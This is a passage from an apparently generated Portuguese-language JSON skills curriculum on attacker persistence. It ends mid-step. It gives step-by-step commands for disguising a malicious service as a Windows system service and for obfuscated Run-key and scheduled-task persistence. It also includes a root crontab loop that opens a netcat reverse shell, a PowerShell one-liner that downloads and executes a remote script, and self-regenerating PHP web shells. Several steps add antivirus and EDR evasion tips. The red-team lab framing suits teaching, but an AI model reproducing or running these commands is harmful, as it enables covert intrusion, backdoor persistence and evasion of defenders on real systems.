                                    "Documente o PID e o caminho do executável para referência futura.",
                                    "Verifique privilégios necessários (geralmente Administrator) para modificações."
                                  ],
                                  "verification": "Confirme a lista gerada mostrando pelo menos 10 serviços legítimos com detalhes anotados em um arquivo de log.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "PowerShell ou CMD com privilégios elevados",
                                    "Bloco de notas para documentação",
                                    "Máquina virtual Windows para testes"
                                  ],
                                  "tips": "Priorize serviços que rodam como SYSTEM para maior credibilidade na mimetização.",
                                  "learningObjective": "Compreender a estrutura e visibilidade dos serviços do Windows para seleção estratégica.",
                                  "commonMistakes": [
                                    "Ignorar serviços críticos do sistema que podem causar instabilidade.",
                                    "Não elevar privilégios, resultando em falha de listagem completa.",
                                    "Selecionar serviços muito monitorados como 'Winlogon'."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar o Payload Malicioso como Serviço",
                                  "subSteps": [
                                    "Crie um executável ou script payload (ex: reverse shell com netcat ou PowerShell Empire).",
                                    "Instale o payload como um novo serviço usando 'sc create' ou New-Service no PowerShell: sc create MaliciousSvc binPath= 'C:\\path\\to\\payload.exe' type= own start= auto.",
                                    "Defina o serviço para iniciar automaticamente e rode como SYSTEM com 'sc config MaliciousSvc obj= LocalSystem password= ''.",
                                    "Inicie o serviço com 'sc start MaliciousSvc' e confirme conectividade do payload.",
                                    "Teste parada e reinício para garantir persistência básica."
                                  ],
                                  "verification": "O serviço inicia sem erros e o payload estabelece conexão C2 confirmada por logs ou callback.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Payload gerado (ex: msfvenom)",
                                    "Ferramentas C2 como Cobalt Strike ou Empire",
                                    "Editor de scripts PowerShell"
                                  ],
                                  "tips": "Use caminhos obfuscados no binPath para evitar detecção inicial por AV.",
                                  "learningObjective": "Aprender a registrar e gerenciar serviços personalizados no Windows.",
                                  "commonMistakes": [
                                    "Esquecer de definir start= auto, causando perda de persistência após reboot.",
                                    "Payload sem privilégios SYSTEM, facilitando detecção.",
                                    "Caminho binPath com espaços não escapados, causando falha na criação."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Modificar Nome e Descrição para Ocultação",
                                  "subSteps": [
                                    "Pare o serviço malicioso: sc stop MaliciousSvc.",
                                    "Renomeie usando PowerShell: $service = Get-WmiObject Win32_Service -Filter \"Name='MaliciousSvc'\"; $service.Change($null, 'svchost', 'Windows Host Process', $null, $null, $null, 'C:\\Windows\\System32\\svchost.exe').",
                                    "Ou use nsudo para edição direta do registro: nsudo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousSvc\" /v DisplayName /t REG_SZ /d \"Windows Update\" /f.",
                                    "Atualize ImagePath para mimetizar: sc config MaliciousSvc binPath= \"C:\\Windows\\System32\\svchost.exe -k netsvcs\".",
                                    "Reinicie o serviço: sc start MaliciousSvc e confirme payload ativo."
                                  ],
                                  "verification": "No Task Manager ou services.msc, o serviço aparece com nome e descrição idênticos ao legítimo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Nsudo ou PowerShell elevado",
                                    "Regedit (opcional para verificação)",
                                    "WMI Explorer para inspeção avançada"
                                  ],
                                  "tips": "Mantenha o ImagePath apontando para svchost.exe real para bypass visual em ferramentas como Process Explorer.",
                                  "learningObjective": "Dominar técnicas de renomeação de serviços via WMI, SC e Registro para evasão.",
                                  "commonMistakes": [
                                    "Não parar o serviço antes de editar, causando locks no registro.",
                                    "Descrições inconsistentes que ainda levantam suspeitas em EDR.",
                                    "Alterar chaves erradas no registro, quebrando o serviço."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Evasão e Persistência",
                                  "subSteps": [
                                    "Reinicie a máquina virtual e verifique se o serviço persiste e payload conecta.",
                                    "Escaneie com ferramentas de monitoramento como Sysmon, Autoruns ou EDR simulado (ex: Defender).",
                                    "Monitore logs de eventos (Event Viewer > Windows Logs > System) por alertas relacionados.",
                                    "Teste detecção em ferramentas como Process Hacker ou TCPView para tráfego oculto.",
                                    "Documente métricas de sucesso: tempo até detecção, visibilidade em UIs comuns."
                                  ],
                                  "verification": "Serviço sobrevive reboot, mimetiza perfeitamente e evade scans básicos por 30+ minutos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Sysmon configurado",
                                    "Autoruns",
                                    "Process Explorer",
                                    "Máquina virtual para reboot"
                                  ],
                                  "tips": "Combine com living-off-the-land binaries (LOLBins) para maior stealth.",
                                  "learningObjective": "Avaliar eficácia de ocultação contra defesas comuns.",
                                  "commonMistakes": [
                                    "Não testar pós-reboot, superestimando persistência.",
                                    "Ignorar logs de eventos que logam mudanças de serviço.",
                                    "Usar payloads ruidosos que geram tráfego detectável."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de red teaming, crie um reverse shell payload instalado como 'UpdaterSvc'. Renomeie para 'wuauserv' com descrição 'Windows Update' e ImagePath 'svchost.exe -k netsvcs'. Após reboot, ele aparece como serviço legítimo no Task Manager, evade Autoruns básico e mantém C2 por horas.",
                              "finalVerifications": [
                                "Serviço listado com nome e descrição idênticos a um legítimo em services.msc.",
                                "Payload persiste após reboot e estabelece conexão C2.",
                                "Nenhuma anomalia em Process Explorer ou Task Manager.",
                                "Sem alertas em Sysmon ou Event Logs relacionados à modificação.",
                                "Evasão de scans manuais com Autoruns e strings.exe.",
                                "Tráfego C2 não correlacionado ao serviço mimetizado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na mimetização: 100% match em nome, descrição e imagem.",
                                "Persistência: Sobrevivência a reboots e stops manuais.",
                                "Stealth: Zero detecções em ferramentas básicas (Task Mgr, Autoruns).",
                                "Eficiência: Tempo de setup < 90 minutos, uptime > 95%.",
                                "Documentação: Logs completos de comandos e verificações.",
                                "Ética: Execução apenas em ambiente isolado com disclaimer."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Scripting avançado em PowerShell e manipulação WMI.",
                                "Sistemas Operacionais: Gerenciamento de serviços e Registro do Windows.",
                                "Segurança da Informação: Análise de ameaças e detecção EDR.",
                                "Redes: Persistência C2 e evasão de network monitoring.",
                                "Ética e Direito: Limites legais em ethical hacking e red teaming."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante jogos de guerra cibernética, essa técnica permite persistência de longo prazo em ambientes corporativos, mimetizando serviços essenciais para evitar detecção por SOCs e EDRs, simulando APTs reais como Cobalt Group."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.4.2",
                        "name": "Persistência via Registry e Agendadores",
                        "description": "Métodos para adicionar entradas no Registro do Windows ou crontab no Linux que executam backdoors em eventos de inicialização ou agendamentos periódicos.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.2.1",
                            "name": "Adição de Run Keys no Registro Windows",
                            "description": "Editar chaves HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run usando reg add para executar payloads ao login, com técnicas de ofuscação para sobreviver a varreduras.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o funcionamento das Run Keys no Registro do Windows",
                                  "subSteps": [
                                    "Pesquisar a hive HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run e sua função ao boot/login",
                                    "Explicar como o Windows executa entradas REG_SZ ou REG_EXPAND_SZ nessa chave durante o logon",
                                    "Identificar requisitos de privilégios (administrador) e diferenças entre HKLM e HKCU",
                                    "Analisar exemplos de payloads maliciosos comuns nessa localização usando ferramentas como Autoruns",
                                    "Documentar riscos de detecção por AV/EDR"
                                  ],
                                  "verification": "Criar um resumo escrito (1 página) explicando o mecanismo e respondendo a 3 perguntas teste sobre privilégios e execução.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Máquina virtual Windows 10/11",
                                    "Autoruns (Sysinternals)",
                                    "Documentação Microsoft Registry"
                                  ],
                                  "tips": "Use uma VM isolada para evitar impactos no host; estude Autoruns para visualizar entradas ativas.",
                                  "learningObjective": "Dominar o conceito de persistência via Run Keys e suas implicações em ethical hacking.",
                                  "commonMistakes": [
                                    "Confundir HKLM (para todos usuários) com HKCU (usuário atual)",
                                    "Subestimar necessidade de privilégios elevados",
                                    "Ignorar detecção por ferramentas de forensics"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Adicionar uma Run Key básica usando o comando reg add",
                                  "subSteps": [
                                    "Abrir Prompt de Comando (CMD) como Administrador",
                                    "Executar: reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"TestePersist\" /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f",
                                    "Verificar a adição com: reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v TestePersist",
                                    "Reiniciar a sessão ou VM para testar execução automática",
                                    "Registrar logs de saída do comando"
                                  ],
                                  "verification": "Confirmar que o payload (ex: calc.exe) executa automaticamente após logon/reboot.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "CMD ou PowerShell elevado",
                                    "Máquina virtual Windows",
                                    "Payload inofensivo como calc.exe"
                                  ],
                                  "tips": "Sempre use /f para forçar sobrescrita sem prompt; teste em VM para segurança.",
                                  "learningObjective": "Executar comandos reg add para persistência básica de forma precisa e verificável.",
                                  "commonMistakes": [
                                    "Executar CMD sem privilégios admin (falha ACCESS_DENIED)",
                                    "Usar aspas incorretas em paths com espaços",
                                    "Não verificar com reg query antes do reboot"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar técnicas de ofuscação na Run Key",
                                  "subSteps": [
                                    "Gerar nome de chave aleatório ou comum (ex: usar PowerShell para randomizar)",
                                    "Converter payload path para REG_EXPAND_SZ com variáveis %TEMP% ou %APPDATA%",
                                    "Ofuscar valor com codificação simples (ex: base64 decode em batch stub)",
                                    "Adicionar: reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%RandomName%\" /t REG_EXPAND_SZ /d \"%TEMP%\\stub.bat\" /f",
                                    "Testar evasão básica com Windows Defender scan"
                                  ],
                                  "verification": "Verificar que a chave obfuscada executa sem alertas iniciais e sobrevive a query reg.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "PowerShell para geração de nomes",
                                    "Editor de texto para stubs obfuscados",
                                    "Windows Defender ou AV gratuito"
                                  ],
                                  "tips": "Combine com nomes de serviços legítimos para blending; evite strings óbvias como 'payload'.",
                                  "learningObjective": "Aplicar ofuscação para tornar persistência stealthy contra varreduras básicas.",
                                  "commonMistakes": [
                                    "Usar REG_SZ em vez de REG_EXPAND_SZ para variáveis",
                                    "Ofuscação fraca detectável por string matching",
                                    "Esquecer de decodificar no stub"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar persistência, detecção e remoção segura",
                                  "subSteps": [
                                    "Reiniciar a VM e monitorar execução com Process Explorer",
                                    "Simular varredura com Autoruns e reg query para detecção",
                                    "Remover chave: reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"TestePersist\" /f",
                                    "Verificar limpeza com múltiplas ferramentas (Autoruns, reg query)",
                                    "Documentar lições aprendidas sobre detecção EDR"
                                  ],
                                  "verification": "Confirmar que payload persiste, é detectável/ofuscado corretamente e é removido sem resquícios.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Process Explorer (Sysinternals)",
                                    "Autoruns",
                                    "Regedit para inspeção visual"
                                  ],
                                  "tips": "Monitore Task Manager durante reboot; pratique remoção para blue team skills.",
                                  "learningObjective": "Validar eficácia da persistência e aprender defesas associadas.",
                                  "commonMistakes": [
                                    "Não reiniciar corretamente para testar",
                                    "Deixar chaves órfãs após testes",
                                    "Ignorar logs de eventos do Windows"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de Red Team, comprometa uma VM Windows Server via phishing simulado. Use reg add para adicionar uma Run Key obfuscada que executa um beacon inofensivo (ex: netcat listener) ao login de um usuário admin, simulando C2 persistence em um jogo de guerra cibernética.",
                              "finalVerifications": [
                                "Run Key adicionada e visível via reg query sem erros",
                                "Payload executa automaticamente após reboot/logon",
                                "Ofuscação evita detecção básica por AV (ex: Defender scan limpo)",
                                "Persistência sobrevive a consultas manuais em Autoruns",
                                "Remoção completa sem resquícios",
                                "Logs documentados de todos os comandos e testes"
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe do reg add (sem erros de privilégio ou path)",
                                "Eficácia da ofuscação (execução stealthy em scans básicos)",
                                "Verificação completa de persistência via reboot e monitoramento",
                                "Documentação clara de steps, verificações e lições",
                                "Conhecimento demonstrado de defesas (Autoruns, EDR concepts)",
                                "Segurança: uso exclusivo de VMs e payloads inofensivos"
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Estrutura do Registro Windows e hives",
                                "Programação: Automação com Batch/PowerShell para ofuscação",
                                "Segurança Defensiva: Detecção de persistência com Sysinternals e EDR",
                                "Redes: Integração com C2 frameworks como Cobalt Strike",
                                "Forense Digital: Análise de Registry artifacts em investigações"
                              ],
                              "realWorldApplication": "Técnica amplamente usada em ataques APT para manter acesso pós-exploração; essencial para Red Teamers em pentests simularem persistence realista, ajudando Blue Teams a aprimorarem detecções em ambientes corporativos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.2.2",
                            "name": "Persistência com Crontab no Linux",
                            "description": "Inserir jobs no crontab do usuário root ou sistema com crontab -e para executar backdoors em intervalos regulares, garantindo reconexão C2 após desconexões.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender e Acessar o Crontab no Linux",
                                  "subSteps": [
                                    "Instale e verifique o pacote cron no sistema Linux (ex: apt install cron no Ubuntu).",
                                    "Aprenda a sintaxe básica do crontab: minutos, horas, dia do mês, mês, dia da semana, comando.",
                                    "Acesse o crontab do usuário root com 'sudo crontab -e' e liste jobs existentes com 'sudo crontab -l'.",
                                    "Estude exemplos de agendamentos regulares, como '* * * * * /path/to/script' para execução a cada minuto.",
                                    "Configure o editor padrão se necessário (ex: export EDITOR=nano)."
                                  ],
                                  "verification": "Execute 'sudo crontab -l' e confirme que lista jobs sem erros; visualize o arquivo sem salvar alterações.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Máquina Linux com privilégios root, terminal, documentação man crontab(5).",
                                  "tips": "Sempre use sudo para root; teste em VM isolada para evitar impactos reais.",
                                  "learningObjective": "Compreender a estrutura e acesso ao crontab para agendamento persistente.",
                                  "commonMistakes": "Esquecer sudo e editar crontab de usuário comum; ignorar sintaxe levando a jobs inválidos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar o Script de Backdoor para Reconexão C2",
                                  "subSteps": [
                                    "Crie um script bash simples (/tmp/backdoor.sh) que testa conectividade e reconecta a um C2 simulado (ex: nc -e /bin/bash IP_C2 4444).",
                                    "Adicione lógica de retry: use um loop while com sleep para tentativas a cada 30s até sucesso.",
                                    "Torne o script executável com chmod +x /tmp/backdoor.sh.",
                                    "Teste o script manualmente: ./backdoor.sh e verifique conexão com netcat listener no C2.",
                                    "Obfusque levemente o script (ex: renomeie variáveis) para simular evasão básica."
                                  ],
                                  "verification": "Execute o script e confirme conexão estabelecida com listener no C2; verifique logs com journalctl -u cron.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Editor de texto (nano/vim), netcat (nc), IP simulado de C2 em ambiente lab.",
                                  "tips": "Use IPs locais (127.0.0.1) para testes iniciais; evite portas privilegiadas sem necessidade.",
                                  "learningObjective": "Desenvolver um payload persistente que garante reconexão automática.",
                                  "commonMistakes": "Script sem shebang (#!/bin/bash); falhar em tornar executável; lógica de loop infinita sem sleep."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Editar Crontab e Inserir o Job Persistente",
                                  "subSteps": [
                                    "Abra 'sudo crontab -e' e adicione linha: '*/5 * * * * /tmp/backdoor.sh' para execução a cada 5 minutos.",
                                    "Salve e saia; verifique inserção com 'sudo crontab -l'.",
                                    "Reinicie o serviço cron: sudo systemctl restart cron.",
                                    "Monitore logs: tail -f /var/log/syslog | grep CRON para confirmação de execução.",
                                    "Adicione job para root persistente: considere @reboot /tmp/backdoor.sh para inicialização."
                                  ],
                                  "verification": "Aguarde 5 minutos, cheque logs CRON e confirme execução do script.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Terminal com sudo, serviço cron ativo.",
                                  "tips": "Use intervalos conservadores (*/5) para testes; sempre logue saídas do script para /var/log/backdoor.log.",
                                  "learningObjective": "Configurar jobs crontab para execução recorrente e persistente de backdoors.",
                                  "commonMistakes": "Caminho absoluto incorreto no job; esquecer de salvar crontab; não reiniciar cron."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Persistência e Limpeza",
                                  "subSteps": [
                                    "Simule desconexão: pare listener C2, espere 2 ciclos (10min), reconecte e verifique reconexão automática.",
                                    "Reinicie o sistema e confirme execução @reboot após boot.",
                                    "Detecte o job: grep CRON /var/log/syslog e ps aux | grep backdoor.",
                                    "Remova para cleanup: sudo crontab -e (deletar linha), rm /tmp/backdoor.sh, systemctl restart cron.",
                                    "Documente detecções: como admins detectam via crontab -l ou anomaly em logs."
                                  ],
                                  "verification": "Confirme reconexões múltiplas após simulações; sistema limpo sem vestígios.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Listener netcat em máquina C2, ferramentas de monitoramento (ps, grep).",
                                  "tips": "Teste em snapshot de VM para reversibilidade; registre timestamps para correlação.",
                                  "learningObjective": "Validar eficácia da persistência e entender detecção/limpeza.",
                                  "commonMistakes": "Não simular reboot; deixar artifacts persistentes; ignorar logs de detecção."
                                }
                              ],
                              "practicalExample": "Em um lab de ethical hacking, crie /tmp/recon.sh com 'while true; do nc -zv 192.168.1.100 4444 && nc -e /bin/bash 192.168.1.100 4444 || sleep 60; done'. Adicione ao root crontab: '*/10 * * * * /tmp/recon.sh > /dev/null 2>&1'. Teste desconectando rede e confirmando shell reverso a cada 10min.",
                              "finalVerifications": [
                                "Crontab -l mostra job corretamente agendado.",
                                "Logs CRON confirmam execuções regulares sem erros.",
                                "Script reconecta C2 após 2-3 ciclos de falha simulada.",
                                "Persistência sobrevive a reboot do sistema.",
                                "Nenhum erro de permissão ou path em execuções.",
                                "Cleanup remove todos artifacts sem resíduo."
                              ],
                              "assessmentCriteria": [
                                "Precisão da sintaxe crontab (sem erros de parsing).",
                                "Robustez do script (retry logic e silence).",
                                "Frequência e confiabilidade de reconexões (taxa >95%).",
                                "Evasão básica de detecção (logs limpos, paths ocultos).",
                                "Documentação de testes e cleanup completa.",
                                "Uso ético em ambiente isolado demonstrado."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Linux (gerenciamento cron).",
                                "Programação Bash (scripts de automação e loops).",
                                "Segurança Ofensiva (técnicas red team persistência).",
                                "Análise de Logs (detecção via syslog/journalctl).",
                                "Redes (reverse shells e conectividade TCP)."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante jogos de guerra cibernética ou pentests autorizados, essa técnica garante acesso persistente em servidores Linux comprometidos, permitindo monitoramento contínuo e exfiltração de dados mesmo após tentativas de limpeza pelo Blue Team, sempre em conformidade com regras de engajamento éticas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.2.3",
                            "name": "Uso de Scheduled Tasks no Windows",
                            "description": "Criar tarefas agendadas via schtasks /create com triggers de boot ou logon, configurando execução silenciosa de shells reversos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste Seguro",
                                  "subSteps": [
                                    "Instale uma máquina virtual Windows 10/11 (ex: VirtualBox ou VMware) isolada da rede real.",
                                    "Habilite o Prompt de Comando como Administrador (clique direito > Executar como admin).",
                                    "Configure um listener Netcat em uma VM Kali Linux: nc -lvnp 4444.",
                                    "Verifique conectividade básica entre VMs usando ping.",
                                    "Crie uma pasta temporária C:\\temp para scripts de teste."
                                  ],
                                  "verification": "Ambiente VM rodando, listener ativo no Kali (nc mostra 'listening'), ping responde entre VMs.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "VM Windows 10/11, VM Kali Linux, VirtualBox/VMware, Netcat.",
                                  "tips": "Use snapshots na VM para reverter mudanças facilmente após testes.",
                                  "learningObjective": "Preparar um ambiente isolado para experimentação segura com persistência.",
                                  "commonMistakes": "Executar em máquina host real (risco de infecção); esquecer privilégios de admin."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar Sintaxe Básica do schtasks /create",
                                  "subSteps": [
                                    "Abra CMD como admin e execute 'schtasks /create /?' para ver ajuda.",
                                    "Crie uma tarefa simples: schtasks /create /tn \"TestTask\" /tr \"cmd /c echo Hello > C:\\temp\\test.txt\" /sc once /st 00:00.",
                                    "Liste tarefas: schtasks /query /tn \"TestTask\".",
                                    "Execute manualmente: schtasks /run /tn \"TestTask\" e verifique arquivo criado.",
                                    "Delete para limpar: schtasks /delete /tn \"TestTask\" /f."
                                  ],
                                  "verification": "Tarefa criada, listada, executa manualmente e produz arquivo de saída correto.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "CMD como admin, pasta C:\\temp.",
                                  "tips": "Sempre use /f no delete para forçar sem prompt.",
                                  "learningObjective": "Compreender parâmetros essenciais de schtasks /create como /tn, /tr, /sc, /st.",
                                  "commonMistakes": "Esquecer aspas em nomes com espaços; não usar admin (erro de permissão)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Tarefa com Triggers de Boot ou Logon para Shell Reverso",
                                  "subSteps": [
                                    "Prepare payload shell reverso: crie batch C:\\temp\\reverse.bat com 'nc.exe -e cmd.exe <IP_KALI> 4444'.",
                                    "Crie tarefa logon: schtasks /create /tn \"PersistLogon\" /tr \"C:\\temp\\reverse.bat\" /sc onlogon /ru SYSTEM /rl HIGHEST.",
                                    "Crie tarefa boot: schtasks /create /tn \"PersistBoot\" /tr \"C:\\temp\\reverse.bat\" /sc onstart /ru SYSTEM.",
                                    "Liste e verifique: schtasks /query /tn \"PersistLogon\" /PersistBoot\" /fo list /v.",
                                    "Reinicie/logoff VM para trigger."
                                  ],
                                  "verification": "Tarefas listadas com status Ready, shell reverso conecta ao listener no trigger.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "nc.exe na VM Windows (baixe portable), IP do Kali, batch reverse.bat.",
                                  "tips": "Use /ru SYSTEM para privilégios elevados sem senha.",
                                  "learningObjective": "Implementar persistência via triggers onlogon/onstart com payload reverso.",
                                  "commonMistakes": "Payload sem -e (cmd não interativo); IP errado ou firewall bloqueando porta."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Execução Silenciosa e Verificar Persistência",
                                  "subSteps": [
                                    "Edite tarefa para silenciosa: schtasks /change /tn \"PersistLogon\" /tr \"cmd /c C:\\temp\\reverse.bat >nul 2>&1\".",
                                    "Desabilite logs: adicione /f no create/change se necessário.",
                                    "Teste múltiplos ciclos: logoff/logon 3x, observe conexões no listener.",
                                    "Monitore Task Scheduler GUI: Win+R > taskschd.msc > ver tarefas.",
                                    "Limpe: schtasks /delete /tn \"PersistLogon\" /PersistBoot\" /f."
                                  ],
                                  "verification": "Shell conecta silenciosamente (sem popups), persiste após reboot/logon múltiplos.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Task Scheduler GUI, listener nc ativo.",
                                  "tips": ">nul 2>&1 redireciona toda saída para suprimir visibilidade.",
                                  "learningObjective": "Tornar backdoor indetectável via execução oculta e alta privilégio.",
                                  "commonMistakes": "Não suprimir output (janela CMD visível); esquecer /rl HIGHEST."
                                }
                              ],
                              "practicalExample": "Em uma VM Windows comprometida: schtasks /create /tn \"WinUpdate\" /tr \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')\" /sc onlogon /ru SYSTEM /rl HIGHEST. Isso baixa e executa shell reverso hidden no logon, simulando 'update'.",
                              "finalVerifications": [
                                "Tarefa persiste após reboot e múltiplos logons.",
                                "Shell reverso conecta automaticamente ao listener sem interação usuário.",
                                "Execução é silenciosa (sem janelas ou logs óbvios).",
                                "Tarefa roda como SYSTEM (verificar com schtasks /query /v).",
                                "Limpieza completa sem resíduos (schtasks /query vazio).",
                                "Detecção via GUI Task Scheduler, mas não óbvia em processos."
                              ],
                              "assessmentCriteria": [
                                "Comandos schtasks executados sem erros de sintaxe.",
                                "Triggers ativam payload corretamente em 100% dos testes.",
                                "Execução 100% silenciosa e privilegiada.",
                                "Explicação clara de parâmetros usados.",
                                "Identificação e mitigação de 3+ erros comuns demonstrada.",
                                "Ambiente limpo pós-teste."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Configuração de shells reversos (Netcat/PowerShell).",
                                "Programação: Scripts batch/PowerShell para payloads.",
                                "Sistemas Operacionais: Gerenciamento de tarefas Windows.",
                                "Segurança: Detecção/evasão de EDR via persistência.",
                                "Ética: Discussão de uso apenas em ambientes controlados."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Ethical Hacking, Scheduled Tasks mantêm acesso persistente em endpoints Windows durante simulações de ataques, permitindo pivoting contínuo sem detecção imediata por AVs básicos, como em jogos de guerra cibernética para testar defesas de Blue Teams."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.4.3",
                        "name": "Backdoors Dinâmicas e Rootkits",
                        "description": "Implementação de backdoors que se auto-regeneram ou utilizam rootkits para hook de chamadas de sistema, assegurando persistência contra remoções.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.3.1",
                            "name": "Criação de Web Shells Persistentes",
                            "description": "Implantar shells PHP/ASP em diretórios web acessíveis, com mecanismos de auto-deleção e regeneração via C2 para manter acesso remoto.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configuração do Ambiente de Laboratório Seguro",
                                  "subSteps": [
                                    "Instale um servidor web local (Apache/Nginx) com suporte a PHP ou ASP.NET em uma VM isolada.",
                                    "Crie um diretório web acessível via HTTP/HTTPS com permissões de escrita (ex: /var/www/html/uploads/).",
                                    "Configure uma vulnerabilidade simulada para upload de arquivos (ex: formulário sem validação).",
                                    "Instale ferramentas de C2 como Covenant ou Empire para simular comunicação de comando e controle.",
                                    "Teste conectividade básica entre o servidor web e o C2 listener."
                                  ],
                                  "verification": "Acesse o diretório web via browser e confirme upload de um arquivo teste; verifique listener C2 ativo sem erros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VMware/VirtualBox",
                                    "Apache/PHP ou IIS/ASP.NET",
                                    "C2 framework (Covenant/Empire)",
                                    "Editor de código (VS Code)"
                                  ],
                                  "tips": "Sempre use redes isoladas (ex: host-only adapter) para evitar exposição real; documente IPs e portas.",
                                  "learningObjective": "Configurar um ambiente controlado para testes de persistência sem riscos à produção.",
                                  "commonMistakes": [
                                    "Usar ambiente de produção",
                                    "Esquecer de isolar a VM",
                                    "Portas firewall bloqueadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolvimento do Web Shell Básico",
                                  "subSteps": [
                                    "Escreva um shell PHP/ASP simples que execute comandos via GET/POST (ex: system($_GET['cmd'])).",
                                    "Adicione ofuscação básica (base64_encode/decode para payloads).",
                                    "Inclua suporte a upload/download de arquivos e execução de comandos remotos.",
                                    "Teste localmente executando comandos como 'whoami' ou 'dir'.",
                                    "Salve como arquivo .php ou .asp com nome discreto (ex: config.php)."
                                  ],
                                  "verification": "Acesse o shell via browser (ex: http://target/config.php?cmd=whoami) e confirme saída correta do comando.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "Servidor web local",
                                    "Documentação PHP/ASP system() function"
                                  ],
                                  "tips": "Use eval() com precauções para payloads dinâmicos; evite strings hardcoded legíveis.",
                                  "learningObjective": "Criar um shell web funcional para execução remota de comandos em servidores comprometidos.",
                                  "commonMistakes": [
                                    "Falta de sanitização levando a erros 500",
                                    "Nomes de arquivos óbvios",
                                    "Exposição de erros PHP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementação de Mecanismo de Auto-Deleção",
                                  "subSteps": [
                                    "Adicione lógica de timer no shell (ex: deletar self após 24h usando unlink(__FILE__)).",
                                    "Use variáveis de ambiente ou arquivos de log para rastrear tempo de vida.",
                                    "Implemente verificação de integridade (hash check) antes da execução.",
                                    "Teste a deleção agendando via cron ou sleep loop simulado.",
                                    "Registre eventos de deleção em log discreto para depuração."
                                  ],
                                  "verification": "Execute o shell, aguarde timer ou force deleção, confirme arquivo removido do diretório.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "Servidor com cron jobs",
                                    "Ferramentas de log (tail -f)"
                                  ],
                                  "tips": "Combine com sleep() para testes rápidos; use microtime() para precisão em PHP.",
                                  "learningObjective": "Adicionar evasão temporal para reduzir janela de detecção.",
                                  "commonMistakes": [
                                    "Timer não triggera por falta de loop",
                                    "Deleção prematura bloqueia testes",
                                    "Logs verbosos expõem atividade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integração com C2 para Regeneração Automática",
                                  "subSteps": [
                                    "Configure beacon no shell para checar C2 periodicamente (ex: curl para listener).",
                                    "No C2, crie tarefa para re-upload do shell via HTTP POST no diretório vulnerável.",
